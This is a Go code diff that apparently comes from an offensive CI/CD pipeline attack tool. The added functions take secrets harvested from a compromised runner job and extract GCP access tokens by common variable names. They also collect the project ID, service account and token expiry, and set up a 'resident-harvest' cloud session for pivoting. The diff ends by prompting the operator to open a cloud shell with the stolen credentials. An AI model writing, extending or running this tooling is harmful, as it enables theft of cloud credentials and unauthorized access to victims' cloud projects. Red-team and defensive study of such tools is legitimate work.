@@ -659,6 +659,7 @@ func (m Model) handleExpressData(msg ExpressDataMsg) (tea.Model, tea.Cmd) {
 			m.runnerVars[k] = v
 		}
 	}
+	m.activateResidentGCPCloudSession(data)
 
 	if data.CachePoison != nil {
 		if m.waiting != nil && m.waiting.CachePoison != nil &&
@@ -760,6 +761,79 @@ func (m Model) handleExpressData(msg ExpressDataMsg) (tea.Model, tea.Cmd) {
 	m.AddOutput("success", fmt.Sprintf("Express data received: %d secrets%s from %s", len(data.Secrets), varInfo, agentShort))
 
 	return m, m.listenForExpressData()
+}
+
+func (m *Model) activateResidentGCPCloudSession(data counter.ExpressDataPayload) {
+	if data.ResidentJob == nil {
+		return
+	}
+	token := residentGCPAccessToken(data.Secrets)
+	if token == "" {
+		return
+	}
+	if m.cloudState != nil && m.cloudState.RawCredentials["ACCESS_TOKEN"] == token {
+		return
+	}
+
+	raw := map[string]string{"ACCESS_TOKEN": token}
+	if project := residentGCPProject(data.Vars, m.runnerVars); project != "" {
+		raw["PROJECT"] = project
+	}
+	if serviceAccount := strings.TrimSpace(data.Vars["GCP_SERVICE_ACCOUNT"]); serviceAccount != "" {
+		raw["SERVICE_ACCOUNT"] = serviceAccount
+	}
+	if expiry := strings.TrimSpace(data.Vars["GCP_ACCESS_TOKEN_EXPIRES_AT"]); expiry != "" {
+		raw["Expiration"] = expiry
+	}
+
+	if m.cloudState != nil && m.cloudState.TempDir != "" {
+		m.cleanupCloudSession()
+	}
+	now := data.Timestamp
+	if now.IsZero() {
+		now = time.Now()
+	}
+	cloudState := &CloudState{
+		Provider:       "gcp",
+		Method:         "resident-harvest",
+		RawCredentials: raw,
+		PivotTime:      now,
+	}
+	if expiry := raw["Expiration"]; expiry != "" {
+		if parsed, err := time.Parse(time.RFC3339, expiry); err == nil {
+			cloudState.Expiry = parsed
+		}
+	}
+	m.cloudState = cloudState
+	m.AddOutput("success", "Resident GCP session ready from trusted runner job")
+	m.AddOutput("info", "  Type 'cloud shell' to enter a local cloud CLI shell")
+}
+
+func residentGCPAccessToken(secrets []counter.ExtractedSecret) string {
+	for _, secret := range secrets {
+		name := strings.ToUpper(strings.TrimSpace(secret.Name))
+		if strings.TrimSpace(secret.Value) == "" {
+			continue
+		}
+		if name == "GCP_ACCESS_TOKEN" || name == "CLOUDSDK_AUTH_ACCESS_TOKEN" || name == "GOOGLE_OAUTH_ACCESS_TOKEN" {
+			return secret.Value
+		}
+		if secret.Type == "gcp" && strings.Contains(name, "ACCESS_TOKEN") {
+			return secret.Value
+		}
+	}
+	return ""
+}
+
+func residentGCPProject(vars, fallback map[string]string) string {
+	for _, source := range []map[string]string{vars, fallback} {
+		for _, key := range []string{"CLOUDSDK_CORE_PROJECT", "GCLOUD_PROJECT", "GOOGLE_CLOUD_PROJECT", "GCP_PROJECT_ID"} {
+			if value := strings.TrimSpace(source[key]); value != "" {
+				return value
+			}
+		}
+	}
+	return ""
 }
 
 func (m Model) expressDataCapturedInDwell(data counter.ExpressDataPayload) bool {
